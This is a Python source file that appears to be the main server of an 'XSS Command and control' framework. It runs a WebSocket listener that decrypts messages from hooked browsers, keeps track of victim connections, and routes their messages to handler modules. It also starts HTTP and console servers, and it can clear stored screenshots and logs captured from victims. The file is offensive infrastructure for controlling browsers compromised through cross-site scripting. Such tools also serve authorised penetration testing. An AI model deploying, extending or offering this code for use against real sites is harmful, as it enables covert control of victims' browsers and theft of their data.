#!/usr/bin/env python

import asyncio
import sys
import json
import server.server as httpServer
from websockets.asyncio.server import serve
from websockets import exceptions
from modules import getModules
import cryptoUtil
import socksUtil
import server.server as httpServer
import binascii
import os
import glob
import config
from modules.ConsoleServer import start_async_console_server
from modules.consoleModule import ConsoleInWeb

modules, defaultModule = getModules.getModules()
introString = "____ ____ ____ _  _ ____ ____ \n[__  |  | |     \\/  [__  [__  \n___] |__| |___ _/\\_ ___] ___] \n\nXSS Command and control"


async def exec(websocket):
    remote_ip = websocket.remote_address[0] if websocket.remote_address else "unknown"
    # In websockets.asyncio, path is in websocket.request.path
    sid = websocket.request.path.strip("/")
    print(f"Connected from {remote_ip} (SID: {sid})")
    
    # Store remote_ip on websocket for other modules to use
    websocket.remote_ip = remote_ip
    
    socksUtil.addSocket(websocket)
    try:
        while True:
            msg_enc = await websocket.recv()
            message_from_client = json.loads(cryptoUtil.decrypt(msg_enc, sid))
            handler = modules[defaultModule]
            if message_from_client["type"] in modules:
                handler = modules[message_from_client["type"]]
            if "msg" in message_from_client:
                await handler.handleMessage(websocket, message_from_client["msg"])
            else:
                await handler.handleMessage(websocket, {"msg": "OK"})
    except exceptions.ConnectionClosed:
        print(f"Closed by client {remote_ip}")
        if websocket in socksUtil.sockets:
            if socksUtil.sockets.index(websocket) == socksUtil.current:
                socksUtil.current = 0
            socksUtil.removeSocket(websocket)


async def main():
    # Start async HTTP server and Console server as asyncio tasks
    # Start HTTP server
    http_task = asyncio.create_task(httpServer.start_async_server())
    # Start Console server using the existing ConsoleInWeb instance from modules
    console_module = modules[ConsoleInWeb.type]
    asyncio.create_task(start_async_console_server(console_module))
    # Start WebSocket server using modern asyncio API and config values
    async with serve(exec, config.WS_HOST, config.WS_PORT):
        await asyncio.get_running_loop().create_future()  # run forever


def clean_console():
    print("Cleaning console screenshots and logs...")
    for pattern in ["console/screenshots/*", "console/logs/*"]:
        for f in glob.glob(pattern):
            try:
                if os.path.isfile(f):
                    os.remove(f)
            except Exception as e:
                print(f"ERROR: Failed to remove {f}: {e}")
    print("Done.")

if __name__ == "__main__":
    if "-q" not in sys.argv:
        print(introString)
    if "-f" in sys.argv:
        clean_console()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nShutting down...")
